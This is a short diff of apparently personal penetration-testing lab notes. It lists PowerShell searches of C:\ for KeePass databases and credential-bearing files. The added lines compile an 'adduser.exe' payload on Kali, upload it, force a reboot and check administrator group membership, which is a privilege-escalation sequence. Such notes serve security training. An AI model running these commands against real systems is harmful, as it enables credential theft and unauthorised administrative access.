@@ -43,4 +43,11 @@ Get-Process admintool -ErrorAction SilentlyContinue | Watch-Command -Difference 
 Get-ChildItem -Path C:\ -Include *.ps1 -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+x86_64-w64-mingw32-gcc adduser.c -o /home/kali/lab3/adduser.exe
+upload adduser.exe
+shutdown /r /t 0 
+Get-LocalGroupMember administrators
+
+system32\spaceman.exe
 ```
